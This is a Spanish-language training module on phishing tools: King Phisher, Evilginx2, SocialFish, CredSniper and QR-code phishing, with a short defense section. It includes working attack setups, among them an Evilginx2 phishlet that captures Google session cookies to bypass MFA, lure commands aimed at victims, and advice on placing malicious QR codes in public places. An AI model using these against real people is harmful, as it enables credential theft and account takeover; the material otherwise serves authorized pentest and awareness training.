# 🎣 Otras Herramientas de Phishing

> *Además de GoPhish y SET, existen otras herramientas especializadas para diferentes vectores de ataque de ingeniería social: King Phisher, Evilginx, herramientas de QR y más.*

---

## 📋 Tabla de contenido

1. [King Phisher](#1-king-phisher)
2. [Evilginx2](#2-evilginx2)
3. [QR Code Phishing](#3-qr-code-phishing)
4. [SocialFish](#4-socialfish)
5. [CredSniper](#5-credsniper)
6. [Comparativa de herramientas](#6-comparativa-de-herramientas)
7. [Defensa y remediación](#7-defensa-y-remediación)
8. [Referencias](#8-referencias)

---

## 1. King Phisher

King Phisher es una herramienta para campañas de phishing con análisis de resultados avanzado.

### Instalación

```bash
# Clonar repositorio
git clone https://github.com/securestate/king-phisher.git
cd king-phisher

# Instalar dependencias
sudo ./install.sh

# Ejecutar
sudo king-phisher
```

### Características

| Característica | Descripción |
|---|---|
| **Templates personalizables** | Crear campañas con plantillas HTML |
| **Rastreo avanzado** | Monitorear clics, aperturas, geolocalización |
| **Reportes profesionales** | Generar informes detallados |
| **Múltiples campañas** | Ejecutar varias campañas simultáneamente |
| **API** | Integración con otros sistemas |

### Ejemplo de uso

```bash
# 1. Iniciar King Phisher
sudo king-phisher

# 2. Abrir interfaz web
# https://localhost:8080

# 3. Crear nueva campaña
# Campaigns → New Campaign
# Nombre: "Phishing Q1 2024"

# 4. Crear plantilla
# Templates → New Template
# [Personalizar HTML]

# 5. Ejecutar campaña
# Campaigns → Send
```

### Templates predefinidos

| Template | Descripción |
|---|---|
| **Google** | Login de Google |
| **Facebook** | Login de Facebook |
| **LinkedIn** | Login de LinkedIn |
| **Microsoft** | Login de Microsoft 365 |
| **Apple** | Login de Apple ID |

---

## 2. Evilginx2

Evilginx2 es una herramienta avanzada para bypass de MFA (Multi-Factor Authentication).

### ⚠️ Advertencia ética

Evilginx2 puede **evitar la autenticación de dos factores**. Solo úsalo en:
- Pentesting autorizado
- Investigación de seguridad
- Entrenamiento en entornos controlados

### Instalación

```bash
# Clonar repositorio
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2

# Compilar
make

# Ejecutar
sudo ./evilginx2
```

### Configuración

```bash
# Configurar dominio y IP
evilginx2> config domain evil.com
evilginx2> config ipv4 10.10.14.5

# Configurar proxy
evilginx2> config proxy none

# Configurar DNS
evilginx2> config dns 10.10.14.5
```

### Crear phishlet

```yaml
# phishlets/google/google.yaml
name: "google"
author: "Tu Nombre"
min_version: "2.0.0"

proxy_hosts:
  - "myaccount.google.com"
  - "accounts.google.com"

sub_filters:
  - "accounts.google.com"
  - "myaccount.google.com"

auth_tokens:
  - "domain:.google.com; ;Secure;HttpOnly;name=SAPISID"
  - "domain:.google.com; ;Secure;HttpOnly;name=SID"
  - "domain:.google.com; ;Secure;HttpOnly;name=HSID"
  - "domain:.google.com; ;Secure;HttpOnly;name=SSID"
  - "domain:.google.com; ;Secure;HttpOnly;name=APISID"
  - "domain:.google.com; ;Secure;HttpOnly;name=__Secure-1PSID"
  - "domain:.google.com; ;Secure;HttpOnly;name=__Secure-3PSID"

auth_urls:
  - "/ServiceLogin?continue=https%3A%2F%2Fmail.google.com"
  - "/ServiceLogin?continue=https%3A%2F%2Fdrive.google.com"

auth_cookies:
  - "domain:.google.com; ;Secure;HttpOnly;name=SAPISID"
  - "domain:.google.com; ;Secure;HttpOnly;name=SID"
  - "domain:.google.com; ;Secure;HttpOnly;name=HSID"
  - "domain:.google.com; ;Secure;HttpOnly;name=SSID"
  - "domain:.google.com; ;Secure;HttpOnly;name=APISID"
```

### Ejemplo de ataque

```bash
# 1. Configurar phishlet
evilginx2> phishlets hostname google accounts.evil.com
evilginx2> phishlets enable google

# 2. Crear landing
evilginx2> lures create google
evilginx2> lures get-url google 0

# 3. Obtener URL para la víctima
# https://accounts.evil.com/login?lure_id=0

# 4. Cuando la víctima hace login
# Evilginx captura las cookies de sesión
# Puedes impersonificar al usuario sin contraseña

# 5. Ver sesiones capturadas
evilginx2> sessions
```

---

## 3. QR Code Phishing

Los QR codes son un vector de phishing cada vez más popular.

### Generar QR codes maliciosos

```bash
# Con qrencode
qrencode -o qr.png "https://tudominio.com/phishing"

# Con Python
python3 -c "
import qrcode
img = qrcode.make('https://tudominio.com/phishing')
img.save('qr.png')
"
```

### Herramientas online

| Herramienta | URL |
|---|---|
| **QR Code Generator** | [https://www.qr-code-generator.com](https://www.qr-code-generator.com) |
| **QRCode Monkey** | [https://www.qrcode-monkey.com](https://www.qrcode-monkey.com) |
| **GoQR.me** | [https://goqr.me](https://goqr.me) |

### Uso en phishing

```bash
# 1. Crear landing page de phishing
# 2. Generar QR code que apunte a la landing
# 3. Imprimir QR codes y colocar en:
#    - Oficinas
#    - Cafeterías
#    - Transporte público
#    - Eventos

# 4. Cuando alguien escanea el QR:
#    - Se abre la landing page
#    - Ingresa credenciales
#    - Se capturan en tu servidor
```

### Ejemplo: QR para WiFi falso

```bash
# Crear QR para red WiFi maliciosa
qrencode -o wifi-qr.png "WIFI:T:WPA;S:FreeOfficeWiFi;P:password123;;"

# Cuando alguien escanea:
# Se conecta a tu red maliciosa
# Puedes interceptar tráfico
```

---

## 4. SocialFish

SocialFish es una herramienta para phishing de redes sociales.

### Instalación

```bash
# Clonar repositorio
git clone https://github.com/UndeadSec/SocialFish.git
cd SocialFish

# Instalar dependencias
pip3 install -r requirements.txt

# Ejecutar
python3 SocialFish.py
```

### Templates disponibles

| Template | Descripción |
|---|---|
| **Facebook** | Login de Facebook |
| **Google** | Login de Google |
| **LinkedIn** | Login de LinkedIn |
| **Twitter** | Login de Twitter |
| **Instagram** | Login de Instagram |
| **GitHub** | Login de GitHub |

### Ejemplo de uso

```bash
# 1. Iniciar SocialFish
python3 SocialFish.py

# 2. Seleccionar template
# [1] Facebook
# [2] Google
# [3] LinkedIn
# [4] Twitter
# [5] Instagram
# [6] GitHub

# 3. Configurar
# IP: 10.10.14.5
# Puerto: 8080

# 4. Obtener URL para la víctima
# http://10.10.14.5:8080

# 5. Cuando alguien haga login
# [+] Facebook Credentials: usuario@email.com:contraseña123
```

---

## 5. CredSniper

CredSniper es una herramienta para capturar credenciales con bypass de MFA.

### Instalación

```bash
# Clonar repositorio
git clone https://github.com/ustayready/CredSniper.git
cd CredSniper

# Instalar dependencias
pip3 install -r requirements.txt

# Ejecutar
python3 credsniper.py
```

### Templates

| Template | Descripción |
|---|---|
| **Google** | Login de Google con MFA |
| **Outlook** | Login de Outlook con MFA |
| **O365** | Login de Office 365 con MFA |

### Ejemplo

```bash
# 1. Iniciar CredSniper
python3 credsniper.py

# 2. Seleccionar template
# [1] Google
# [2] Outlook
# [3] O365

# 3. Configurar
# IP: 10.10.14.5
# Puerto: 443

# 4. Obtener URL
# https://tudominio.com

# 5. Cuando la víctima ingrese credenciales y MFA
# CredSniper captura ambas (credenciales + código MFA)
```

---

## 6. Comparativa de herramientas

| Herramienta | MFA Bypass | Templates | Rastreo | Facilidad | Ideal para |
|---|---|---|---|---|---|
| **GoPhish** | ❌ | Personalizados | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Campañas empresariales |
| **SET** | ❌ | Predefinidos | ⭐⭐⭐ | ⭐⭐⭐ | Pentesting rápido |
| **King Phisher** | ❌ | Personalizados | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Campañas avanzadas |
| **Evilginx2** | ✅ | Personalizados | ⭐⭐⭐⭐ | ⭐⭐ | Bypass de MFA |
| **SocialFish** | ❌ | Redes sociales | ⭐⭐⭐ | ⭐⭐⭐⭐ | Phishing de redes sociales |
| **CredSniper** | ✅ | Limitados | ⭐⭐⭐⭐ | ⭐⭐⭐ | Captura de MFA |

### Recomendaciones por caso de uso

| Caso | Herramienta recomendada |
|---|---|
| **Primera campaña de concientización** | GoPhish |
| **Pentesting rápido** | SET |
| **Campaña con bypass de MFA** | Evilginx2 |
| **Phishing de redes sociales** | SocialFish |
| **Evaluación de MFA** | CredSniper |
| **Reportes profesionales** | King Phisher |

---

## 7. Defensa y remediación

### Para Blue Team / Equipo de Seguridad

| Vector | Detección | Mitigación |
|---|---|---|
| **Phishing de credenciales** | Analizar headers, URLs | MFA, password managers |
| **Bypass de MFA** | Monitorear sesiones anómalas | FIDO2, hardware tokens |
| **QR codes** | Verificar URLs antes de escanear | Políticas de uso de QR |
| **Phishing de redes sociales** | Entrenamiento, reporte | Políticas de uso |

### Configurar detección

```bash
# Monitorear tráfico sospechoso
tcpdump -i eth0 port 80 or port 443 | grep -i "POST"

# Detectar dominios sospechosos
# Usar herramientas como PhishTank, URLScan.io
```

### Entrenamiento continuo

| Actividad | Frecuencia | Responsable |
|---|---|---|
| Campañas de phishing | Mensual | Equipo de Seguridad |
| Análisis de resultados | Post-campaña | Management |
| Entrenamiento interactivo | Trimestral | RRHH + Seguridad |
| Evaluación de MFA | Semestral | Equipo de Seguridad |

---

## 8. Referencias

### Fuentes primarias

| Recurso | URL |
|---|---|
| **King Phisher** | [https://github.com/securestate/king-phisher](https://github.com/securestate/king-phisher) |
| **Evilginx2** | [https://github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) |
| **SocialFish** | [https://github.com/UndeadSec/SocialFish](https://github.com/UndeadSec/SocialFish) |
| **CredSniper** | [https://github.com/ustayready/CredSniper](https://github.com/ustayready/CredSniper) |
| **MITRE ATT&CK — Phishing** | [https://attack.mitre.org/techniques/T1566/](https://attack.mitre.org/techniques/T1566/) |

### Frameworks de referencia

| Framework | Uso |
|---|---|
| **MITRE ATT&CK** | Tácticas y técnicas de adversarios |
| **NIST CSF** | Marco de seguridad |
| **ISO 27001** | Gestión de seguridad |

---

## 📝 Entregable de portafolio

```markdown
# Campaña de Phishing con Evilginx2 — [Nombre de la empresa]

## Contexto
- Objetivo: Evaluar bypass de MFA
- Herramienta: Evilginx2
- Duración: 1 semana

## Diseño del ataque
- Vector: Email con enlace a Evilginx2
- Landing: Clon de Microsoft 365
- Objetivo: Capturar credenciales + tokens MFA

## Resultados
- Emails enviados: 20
- Clics: 12 (60%)
- Credenciales capturadas: 8 (40%)
- Tokens MFA capturados: 5 (25%)

## Análisis
- Evilginx2 evitó MFA exitosamente
- Tokens de sesión permitieron acceso persistente
- Los usuarios no detectaron la suplantación

## Recomendaciones
1. Implementar FIDO2 en lugar de SMS/Authenticator
2. Monitorear sesiones anómalas
3. Entrenamiento en detección de phishing avanzado
4. Usar hardware tokens para cuentas críticas

## Evidencia
- Output de Evilginx2: [enlace]
- Cookies capturadas: [enlace]
- Screenshot: [enlace]
```

---

**[⬅ SET Toolkit](./02-set-toolkit.md)** · **[⬅ Volver al módulo](../README.md)** · **[→ Pretexting](../pretexting/01-pretexting-principios.md)**
